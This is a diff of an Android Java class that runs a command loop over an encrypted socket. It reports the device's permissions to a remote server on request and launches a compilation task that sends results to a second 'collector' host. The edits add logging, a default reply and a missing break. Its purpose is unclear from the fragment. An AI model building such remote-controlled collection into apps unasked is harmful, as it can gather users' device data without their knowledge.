@@ -10,12 +10,13 @@ import java.io.IOException;
 import javassist.NotFoundException;
 
 public class CommunicationTask extends AsyncTask<Void, Void, String> {
-    private static final String LOGCAT_TAG = "COMMUNICATION_TASK";
+    private static final String TAG = "Communication Task";
 
     private final Context context;
 
     private final String socketMainHostname;
     private final int socketMainPort;
+
     private CryptedSocket socketMain;
 
 
@@ -36,10 +37,9 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
 
             while (isAlive) {
                 String commandReceived = this.socketMain.read();
+                Log.d(TAG, commandReceived);
 
                 String toSend = "";
-
-                // Messages
                 switch (commandReceived) {
                     case "Permissions":
                         toSend = DeviceUtils.getPermissions(this.context, false);
@@ -68,16 +68,19 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
 
                         CompilationTask compilationTask = new CompilationTask(this.context, socketCollectorHostname, socketCollectorPort);
                         compilationTask.executeOnExecutor(AsyncTask.SERIAL_EXECUTOR, taskParams);
+
+                        toSend = "Starting";
+                        break;
                     case "Close":
                         isAlive = false;
-                        toSend = "Close";
+                        toSend = "Closing";
                         break;
+                    default:
+                        toSend = "Unknown command";
                 }
 
-
-                if (!toSend.equals("")) {
-                    this.socketMain.write(toSend);
-                }
+                Log.d(TAG, toSend);
+                this.socketMain.write(toSend);
             }
         } catch (IOException | PackageManager.NameNotFoundException e) {
             e.printStackTrace();
